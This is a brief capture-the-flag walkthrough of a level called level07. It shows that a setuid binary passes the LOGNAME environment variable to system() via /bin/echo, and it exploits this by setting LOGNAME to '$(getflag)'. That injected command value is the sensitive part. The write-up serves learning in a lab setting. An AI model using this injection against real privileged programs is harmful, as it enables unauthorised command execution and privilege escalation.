# Level07
## Step by step
- In the user `level07` home directory, there is a file
  ```bash
  > ls
  -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
  ```
- The executable `level07` print the following when execute
  ```
  > ./level
  level07
  ```
- With the command `strings` we can see that the program is using `/bin/echo` `getenv` and `LOGNAME`
  ```
  > strings level07
  /lib/ld-linux.so.2
  zE&9qU
  __gmon_start__
  libc.so.6
  _IO_stdin_used
  setresgid
  asprintf
  getenv
  setresuid
  system
  getegid
  geteuid
  __libc_start_main
  GLIBC_2.0
  PTRh 
  UWVS
  [^_]
  LOGNAME
  /bin/echo %s 
  ;*2$"
  ```
- The enviroment contains the variable `LOGNAME=level07`, so lets change it to get the flag
  ```bash
  > export LOGNAME='$(getflag)'
  > ./level07
  Check flag.Here is your token : XXX
  ```
  
